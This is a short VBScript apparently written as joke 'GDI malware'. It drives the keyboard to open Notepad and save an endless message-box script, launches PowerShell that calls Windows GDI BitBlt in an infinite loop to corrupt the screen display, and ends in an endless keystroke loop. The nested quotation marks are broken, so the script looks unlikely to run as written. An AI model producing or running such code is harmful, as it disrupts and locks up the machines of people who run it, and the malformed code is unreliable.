Set shell = CreateObject("WScript.Shell")
shell.SendKeys "#r"
WScript.Sleep 1000
shell.SendKeys "notepad"
WScript.Sleep 3000
shell.SendKeys "Do"
shell.SendKeys "{ENTER}"
shell.SendKeys "MsgBox "xd""
shell.SendKeys "{ENTER}"
shell.SendKeys "Loop"
shell.SendKeys "^s"
WScript.Sleep 2000
shell.SendKeys "xdv2.vbs"
WScript.Sleep 2000
shell.Run "powershell -NoExit -Command "Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
public static extern IntPtr GetDC(IntPtr hwnd);
[DllImport("user32.dll")]
public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
[DllImport("gdi32.dll")]
public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
"@ -Name "GDI" -Namespace "Win32"

$hdc = [Win32.GDI]::GetDC([IntPtr]::Zero)
$random = New-Object System.Random

Write-Host "Ah yes, the classic GDI Malware. It's so rare to see a VBS file do something like this, but I guess it is now real."

try {
    while ($true) {
        $x = $random.Next(0, 1920)
        $y = $random.Next(0, 1080)
        $w = $random.Next(50, 300)
        $h = $random.Next(50, 300)
        
        # Копируем прямоугольник экрана на самого себя со смещением
        [Win32.GDI]::BitBlt($hdc, $x + $random.Next(-10, 10), $y + $random.Next(-10, 10), $w, $h, $hdc, $x, $y, 0x00CC0020)
    }
} finally {
    [Win32.GDI]::ReleaseDC([IntPtr]::Zero, $hdc)
}""
WScript.Sleep 1000
Do
shell.SendKeys "xd"
Loop
